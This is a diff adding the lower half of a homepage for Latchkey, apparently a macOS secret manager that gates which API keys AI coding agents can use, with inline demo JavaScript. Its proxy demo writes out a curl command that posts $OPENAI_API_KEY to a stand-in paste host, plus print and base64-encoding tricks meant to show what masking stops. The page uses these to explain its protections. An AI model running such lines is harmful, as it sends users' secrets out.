+        <button class="button secondary small" type="button" data-try="leak">Send it elsewhere</button>
+      </div>
+      <div class="term mini"><pre id="proxy-out"><span class="d">Choose something for the command to try.</span></pre></div>
+      <p class="fine" id="proxy-status" aria-live="polite"></p>
+    </div>
+    <p>For AWS, <code>lk run --aws-session</code> gives the command credentials from STS that expire after 15 minutes, while your long-lived key stays in Latchkey.</p>
+    <figure class="code"><figcaption><span>Terminal</span><button class="copy" type="button" aria-label="Copy code">Copy</button></figcaption><pre><code>lk run --proxy --env shop/development -- npm test
+lk run --aws-role arn:aws:iam::123456789012:role/dev -- terraform plan</code></pre></figure>
+
+    <h2 id="after">After an agent session</h2>
+    <p><code>lk touched</code> lists every key Latchkey released to programs the agent started. <code>lk rotate</code> walks through them one by one. It ends the grants that cover them, opens each service's page for making a new key, saves what you paste with the old value kept in history, and pushes the new value to any Vercel, GitHub Actions, Railway or Fly environment it's linked to.</p>
+    <figure class="code"><figcaption><span>Terminal</span><button class="copy" type="button" aria-label="Copy code">Copy</button></figcaption><pre><code>lk touched --since 4h --by claude
+lk rotate --touched --since 4h --by claude --open --push</code></pre></figure>
+
+    <h2 id="security">How it protects keys, and where it stops</h2>
+    <p>Values live in iCloud Keychain in an access group only the signed Latchkey app can read, and sync end to end encrypted to each Mac signed in to your Apple Account that has Latchkey installed. The <code>lk</code> tool checks the app's code signature before sending anything, and the app checks the tool's. Grants are kept where only Latchkey can change them. The access log records releases, changes and refusals, with likely secrets in command arguments redacted, and chains each entry to the last, so <code>lk log --verify</code> notices an entry that was edited or removed.</p>
+    <p>Latchkey can't help with these:</p>
+    <ul class="limits">
+      <li>A command you allowed has the key, and Latchkey can't control what it does with it. <code>--proxy</code> is the exception, for OpenAI and Anthropic.</li>
+      <li>Any program running under your account can ask. Keep grants narrow, and deny requests you don't recognize.</li>
+      <li>Someone with your Apple Account and a trusted device can reach iCloud Keychain.</li>
+    </ul>
+    <p><a href="developers/api.html">Formats, the protocol and the files Latchkey keeps</a></p>
+
+    <h2 id="more">Also in Latchkey</h2>
+    <dl class="facts">
+      <dt>Projects and environments</dt><dd>Items are <code>project/environment/NAME</code> or shared. Use names like <code>vercel.preview</code> when a service needs different values.</dd>
+      <dt>History</dt><dd>The last 10 values of each item, and deleted items for 30 days.</dd>
+      <dt>Remote locations</dt><dd>Link an environment to Vercel, GitHub Actions, Railway or Fly, check what's missing, and push with each service's own tool. Production needs a second confirmation.</dd>
+      <dt>MCP server</dt><dd><code>lk mcp</code> lets an agent list items, check what a run would get, run commands and ask for a grant. It has no direct secret-read tool. Child output masks exact values; transformed secrets can still leak.</dd>
+      <dt>Latchkey for Safari</dt><dd>When a page shows you a new key, the extension spots it and offers to save it to Latchkey, with your approval. Select anything it missed and save that. In a field that takes a key, it fills one from Latchkey on deployment sites, with Touch ID each time.</dd>
+      <dt>Another Mac over SSH</dt><dd>Forward the app's socket with <code>ssh -R</code>; each read without the No Approval setting asks you here; local grants do not apply.</dd>
+    </dl>
+
+    <h2 id="install">Install</h2>
+    <ol class="install">
+      <li>From a source checkout, run <code>scripts/install.sh</code> to build and install Latchkey.</li>
+      <li>Open Latchkey, then choose <b>Latchkey › Install Command Line Tool…</b> to add <code>latchkey</code> and <code>lk</code> to <code>~/.local/bin</code>.</li>
+      <li>Run <code>lk status</code>. It should say <code>storage: iCloud Keychain</code>.</li>
+    </ol>
+    <p class="placeholder">Development preview: there is no public disk image or Homebrew release yet. If you have the source checkout, use <code>scripts/install.sh</code> with Xcode and XcodeGen installed; configure your signing team in <code>App/project.yml</code> for iCloud Keychain storage. See the <a href="developers/quickstart.html#install">source installation steps</a>.</p>
+    <p class="fine">macOS 15 or later. Intel release verification is pending. iCloud Keychain on for sync between Macs. <a href="developers/quickstart.html">Quickstart</a> · <a href="developers/cli.html">Command reference</a></p>
+  </main>
+
+  <footer class="site">
+    <div class="wrap">
+      <span>Latchkey by <a href="https://www.snackstud.io">Snack Studio</a></span>
+      <ul>
+        <li><a href="developers/index.html">Docs</a></li>
+        <li><a href="developers/agents.html">Agents and MCP</a></li>
+        <li><a href="developers/api.html">References and API</a></li>
+      </ul>
+    </div>
+  </footer>
+  <script src="site.js"></script>
+  <script>
+  // The home page's scenes. Each one only redraws what Latchkey really prints and shows; with reduced motion they
+  // jump to each step instead of animating.
+  (function () {
+    document.documentElement.classList.add("js");
+    var reduce = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+    function $(id) { return document.getElementById(id); }
+    function wait(ms) { return new Promise(function (r) { setTimeout(r, reduce ? 0 : ms); }); }
+    function esc(t) { return t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
+    function whenSeen(el, fn) {
+      if (reduce || !("IntersectionObserver" in window)) { fn(); return; }
+      var io = new IntersectionObserver(function (es) { if (es[0].isIntersecting) { io.disconnect(); fn(); } }, { threshold: 0.4 });
+      io.observe(el);
+    }
+
+    // ---- The approval panel
+    var out = $("demo-out"), panel = $("demo-panel"), status = $("demo-status"), restart = $("demo-restart");
+    var only = $("demo-only"), cmdCell = $("demo-cmd"), onlyCmd = $("demo-only-cmd");
+    var choices = panel.querySelectorAll("button[data-choice]");
+    var PROMPT = '<span class="p">~/Projects/shop $</span> ';
+    var BASE = "lk run --env shop/development -- ";
+    var OUTPUT = {
+      "npm test": ['<span class="d">&gt; shop@1.0.0 test</span>', '<span class="d">&gt; vitest run</span>', "",
+                   " ✓ db/connect.test.ts (3 tests)", '   connecting to <span class="c">&lt;concealed by latchkey&gt;</span>',
+                   " ✓ billing/charge.test.ts (5 tests)", "", " Test Files  2 passed (2)"],
+      "npm run dev": ['<span class="d">&gt; shop@1.0.0 dev</span>', '<span class="d">&gt; next dev</span>', "",
+                      "  ▲ Next.js", "  - Local:   http://localhost:3000", "  ✓ Ready"]
+    };
+    var REFUSED = ['<span class="err">latchkey: refused: shop/development/DATABASE_URL, shop/development/STRIPE_KEY (not agent-safe, not approved, no grant)</span>',
+                   '<span class="err">  Ask the owner to approve it in Latchkey, or to grant it: latchkey grant shop/development/DATABASE_URL,shop/development/STRIPE_KEY --folder ~/Projects/shop --for 2h. Don\'t retry.</span>'];
+    var run = 0, grant = null, current = null, usedKeyboard = false;
+
+    function write(html) { out.innerHTML += html; out.scrollTop = out.scrollHeight; }
+    function caret(on) {
+      var c = out.querySelector(".caret"); if (c) c.remove();
+      if (on) write('<span class="caret"></span>');
+    }
+    var RUN_FLAGS = ["--env", "--env-file", "--file", "--no-masking", "--proxy", "--aws-session", "--aws-role"];
+    var completeBox = document.createElement("ul");
+    completeBox.className = "complete"; completeBox.hidden = true; completeBox.setAttribute("aria-hidden", "true");
+    out.parentNode.appendChild(completeBox);
+    /// Suggestions for the part being typed: actions after lk, options after that, the -- separator.
+    function suggest(typed) {
+      var parts = typed.split(" "), cur = parts[parts.length - 1];
+      if (parts.length === 2 && cur) {
+        return Object.keys(LK.actions).filter(function (a) { return a.indexOf(cur) === 0; }).slice(0, 4)
+          .map(function (a) { return { name: a, tip: LK.actions[a], act: true }; });
+      }
+      var pastSeparator = parts.slice(0, -1).indexOf("--") >= 0;   // after --, it's the program's own arguments
+      if (!pastSeparator && cur.indexOf("-") === 0) {
+        var list = RUN_FLAGS.filter(function (f) { return f.indexOf(cur) === 0; })
+          .map(function (f) { return { name: f, tip: LK.flags[f][0] }; });
+        if ("--".indexOf(cur) === 0) list.push({ name: "--", tip: "Everything after this is the command lk starts" });
+        return list.slice(0, 5);
+      }
+      return [];
+    }
+    function showComplete(typed, full) {
+      var items = suggest(typed);
+      if (!items.length) { completeBox.hidden = true; return; }
+      var target = full.split(" ")[typed.split(" ").length - 1];
+      completeBox.innerHTML = items.map(function (it) {
+        return '<li' + (it.name === target ? ' class="sel"' : "") + '><b' + (it.act ? ' class="a"' : "") + ">" + esc(it.name) +
+               "</b><span>" + esc(it.tip) + "</span></li>";
+      }).join("");
+      var c = out.querySelector(".caret"), term = out.parentNode.getBoundingClientRect();
+      if (!c) return;
+      var r = c.getBoundingClientRect();
+      completeBox.hidden = false;
+      var left = Math.min(r.left - term.left, term.width - completeBox.offsetWidth - 8);
+      completeBox.style.left = Math.max(8, left) + "px";
+      completeBox.style.top = (r.bottom - term.top + 4) + "px";
+    }
+    async function type(text, id) {
+      caret(false);
+      var before = out.innerHTML + PROMPT;
+      if (!reduce) {
+        for (var i = 1; i <= text.length; i++) {
+          if (id !== run) { completeBox.hidden = true; return; }
+          out.innerHTML = before + esc(text.slice(0, i)) + '<span class="caret"></span>';
+          out.scrollTop = out.scrollHeight;
+          showComplete(text.slice(0, i), text);
+          await wait(completeBox.hidden ? 18 : 55);
+        }
+      }
+      completeBox.hidden = true;
+      out.innerHTML = before + (text ? LK.highlight(text, { inert: true }) : "");
+      out.scrollTop = out.scrollHeight;
+    }
+    async function lines(list, id) {
+      for (var i = 0; i < list.length; i++) { if (id !== run) return; write("\n" + list[i]); await wait(90); }
+    }
+    function showPanel(cmd) {
+      cmdCell.textContent = BASE + cmd;
+      onlyCmd.textContent = cmd;
+      only.checked = false;
+      choices.forEach(function (b) { b.disabled = false; });
+      only.disabled = false;
+      panel.classList.add("on");
+      panel.removeAttribute("aria-hidden");
+      if (usedKeyboard) choices[choices.length - 1].focus();
+    }
+    function hidePanel() {
+      choices.forEach(function (b) { b.disabled = true; });
+      only.disabled = true;
+      panel.classList.remove("on");
+      panel.setAttribute("aria-hidden", "true");
+    }
+    function covered(cmd) { return grant && (!grant.only || grant.only === cmd); }
+
+    async function attempt(cmd, id) {
+      current = cmd;
+      await type(BASE + cmd, id);
+      if (id !== run) return;
+      if (covered(cmd)) {
+        record("allowed (grant " + grant.id + ")", true);
+        status.textContent = "The grant covers this run" + (grant.only ? " of " + grant.only : "") + ", so nothing asks. It ends when claude quits.";
+        await wait(300); await lines(OUTPUT[cmd], id); write("\n"); await type("", id); caret(true);
+        finish("A grant made from the panel lasts until claude quits" + (grant.only ? " and covers only " + grant.only : "") + ".");
+        return;
+      }
+      caret(true);
+      status.textContent = "Latchkey is asking on your Mac. Choose in the panel.";
+      await wait(250);
+      if (id === run) showPanel(cmd);
+    }
+    function finish(text) { status.textContent = text; restart.hidden = false; if (usedKeyboard) restart.focus(); }
+
+    // ---- Touch ID, then what the app records: the menu bar panel here, and the app window (app-demo.js).
+    var touch = $("touch"), touchText = $("touch-text"), mbIcon = $("mb-icon"), mbMenu = $("mb-menu"), mbList = $("mb-activity");
+    var IDS = ["shop/development/DATABASE_URL", "shop/development/STRIPE_KEY"];
+    function touchID(cmd) {
+      touchText.textContent = "Latchkey is trying to release DATABASE_URL and STRIPE_KEY from shop/development to zsh › claude › Terminal in ~/Projects/shop (running lk run --env shop/development -- " + cmd + ").";
+      return new Promise(function (resolve) {
+        var done = false, timer;
+        function end(ok) {
+          if (done) return; done = true; clearTimeout(timer);
+          touch.classList.remove("reading");
+          if (!ok) { touch.hidden = true; resolve(false); return; }
+          touch.classList.add("ok");
+          setTimeout(function () { touch.hidden = true; touch.classList.remove("ok"); resolve(true); }, reduce ? 300 : 500);
+        }
+        touch.hidden = false; touch.classList.add("reading");
+        touch.querySelector('[data-t="pw"]').onclick = function () { end(true); };
+        touch.querySelector('[data-t="deny"]').onclick = function () { end(false); };
+        if (usedKeyboard) touch.querySelector('[data-t="deny"]').focus();
+        // The visitor's finger on the sensor, a moment later.
+        timer = setTimeout(function () { end(true); }, reduce ? 900 : 1800);
+      });
+    }
+    function record(decision, ok) {
+      var entry = { op: "get", names: IDS, decision: decision, chain: "zsh › claude › Terminal", cwd: "~/Projects/shop", time: new Date() };
+      document.dispatchEvent(new CustomEvent("lk:activity", { detail: entry }));
+      var empty = mbList.querySelector(".mb-empty"); if (empty) empty.remove();
+      var li = document.createElement("li");
+      li.className = ok ? "yes" : "no";
+      li.innerHTML = "<b></b><span></span>";
+      li.querySelector("b").textContent = "get DATABASE_URL, STRIPE_KEY";
+      li.querySelector("span").textContent = decision + " · zsh › claude › Terminal";
+      mbList.insertBefore(li, mbList.firstChild);
+      while (mbList.children.length > 3) mbList.lastChild.remove();
+      mbIcon.classList.remove("flash"); void mbIcon.offsetWidth; mbIcon.classList.add("flash");
+    }
+    function closeMenu(focusIcon) { mbMenu.hidden = true; mbIcon.setAttribute("aria-expanded", "false"); if (focusIcon) mbIcon.focus(); }
+    mbIcon.addEventListener("click", function () {
+      var open = mbMenu.hidden;
+      mbMenu.hidden = !open; mbIcon.setAttribute("aria-expanded", String(open));
+    });
+    document.addEventListener("click", function (ev) {
+      if (!mbMenu.hidden && !mbMenu.contains(ev.target) && !mbIcon.contains(ev.target)) closeMenu(false);
+    });
+    mbMenu.addEventListener("keydown", function (ev) { if (ev.code === "Escape") closeMenu(true); });
+    mbIcon.addEventListener("keydown", function (ev) { if (ev.code === "Escape") closeMenu(true); });
+    mbMenu.querySelector("a").addEventListener("click", function () { closeMenu(false); });
+    function newID() { return Math.random().toString(16).slice(2, 8); }
+    document.addEventListener("lk:revoke", function (ev) {
+      if (grant && grant.id === ev.detail.id) {
+        grant = null;
+        status.textContent = "Grant revoked in the app. The agent's next run asks again.";
+      }
+    });
+
+    async function choose(choice) {
+      var id = run, cmd = current;
+      var onlyThis = only.checked;
+      hidePanel(); caret(false);
+      if (choice !== "deny") {
+        status.textContent = "macOS asks for Touch ID to confirm.";
+        if (!(await touchID(cmd))) choice = "deny";
+        if (id !== run) return;
+      }
+      if (choice === "deny") {
+        record("denied", false);
+        await lines(REFUSED, id); write("\n"); await type("", id); caret(true);
+        finish("Denied. lk exits with 77, and the agent's instructions tell it to stop and ask you.");
+      } else if (choice === "once") {
+        record("approved", true);
+        await lines(OUTPUT[cmd], id); write("\n"); await type("", id); caret(true);
+        finish("Released for this run. The same request from the same place won't ask again for 2 minutes.");
+      } else {
+        grant = { only: onlyThis ? cmd : null, id: newID() };
+        var limits = (grant.only ? "only " + grant.only + ", " : "") + "until claude quits";
+        record("approved (grant " + grant.id + " for 1 day, " + limits + ")", true);
+        document.dispatchEvent(new CustomEvent("lk:grant", { detail: { id: grant.id, names: IDS, folder: "~/Projects/shop", limits: limits } }));
+        await lines(OUTPUT[cmd], id);
+        write("\n");
+        status.textContent = "Grant made. The agent runs something next…";
+        await wait(900);
+        await attempt(grant.only ? "npm run dev" : "npm test", id);
+        if (grant.only && id === run) status.textContent = "npm run dev isn't covered by a grant for npm test, so Latchkey asks again.";
+      }
+    }
+    choices.forEach(function (b) {
+      b.addEventListener("click", function () { choose(b.dataset.choice); });
+      b.addEventListener("keydown", function () { usedKeyboard = true; });
+    });
+    async function start() {
+      run++; var id = run;
+      grant = null; restart.hidden = true; hidePanel();
+      out.innerHTML = "";
+      status.textContent = "You're the person at the Mac: when the agent's command asks, choose in the panel.";
+      await attempt("npm test", id);
+    }
+    restart.addEventListener("click", function () { usedKeyboard = true; start(); });
+    hidePanel();
+    out.innerHTML = PROMPT;
+    whenSeen($("demo"), start);
+
+    // ---- The env file rewriting itself
+    var importBtn = $("import-run"), importStatus = $("import-status");
+    var values = document.querySelectorAll("#import-demo .v");
+    var imported = false;
+    importBtn.addEventListener("click", async function () {
+      importBtn.disabled = true;
+      imported = !imported;
+      importStatus.textContent = imported ? "Asking once for both items…" : "";
+      await wait(imported ? 500 : 0);
+      for (var i = 0; i < values.length; i++) {
+        var v = values[i];
+        v.textContent = imported ? v.dataset.after : v.dataset.before;
+        v.classList.toggle("swapped", imported);
+        await wait(260);
+      }
+      importStatus.textContent = imported
+        ? "Both values are in iCloud Keychain under shop/development, and the file holds their references. lk run fills them back in."
+        : "Press the button to import this file.";
+      importBtn.textContent = imported ? "Show the file before" : "Run lk import --rewrite";
+      importBtn.disabled = false;
+    });
+
+    // ---- The key proxy
+    var auth = $("proxy-auth"), host = $("proxy-host"), packet = document.querySelector("#proxy-demo .packet");
+    var pout = $("proxy-out"), pstatus = $("proxy-status");
+    var PH = "lk-proxy-3f9c2a7e1b8d4c6f9a0e5d2b7c1f8e4a";
+    var TRIES = {
+      call: { cmd: "node chat.js", host: "api.openai.com", auth: "sk-proj-•••• (the real key, added by lk run)", real: true,
+              out: "", status: "The request carried the placeholder to lk run, which put the real key on it for api.openai.com. The command never had it." },
+      print: { cmd: "node -e 'console.log(process.env.OPENAI_API_KEY)'", out: PH,
+               status: "All the command can print is the placeholder." },
+      encode: { cmd: "printenv OPENAI_API_KEY | base64", out: "bGstcHJveHktM2Y5YzJhN2UxYjhkNGM2ZjlhMGU1ZDJiN2MxZjhlNGE=",
+                status: "Encoding gets past masking, but this decodes to the placeholder, which works only through lk run on this Mac." },
+      leak: { cmd: 'curl -s https://paste.example -d "$OPENAI_API_KEY"', host: "paste.example", auth: PH + " (only the placeholder)", bad: true,
+              out: "", status: "Requests to anywhere but api.openai.com don't go through lk run's proxy, so they carry only the placeholder." }
+    };
+    document.querySelectorAll("#proxy-demo [data-try]").forEach(function (b) {
+      b.addEventListener("click", async function () {
+        var t = TRIES[b.dataset.try];
+        pout.innerHTML = PROMPT + esc(t.cmd) + (t.out ? "\n" + esc(t.out) : "");
+        pstatus.textContent = "";
+        if (t.host) {
+          host.textContent = t.host; host.classList.toggle("bad", !!t.bad);
+          auth.textContent = PH; auth.className = "";
+          packet.classList.remove("go"); void packet.offsetWidth; packet.classList.add("go");
+          await wait(t.bad ? 900 : 450);
+          auth.textContent = t.auth; auth.className = t.real ? "real" : t.bad ? "bad" : "";
+          await wait(t.bad ? 0 : 450);
+        }
+        pstatus.textContent = t.status;
+      });
+    });
+  })();
+  </script>
+  <script src="app-demo.js"></script>
+</body>
+</html>
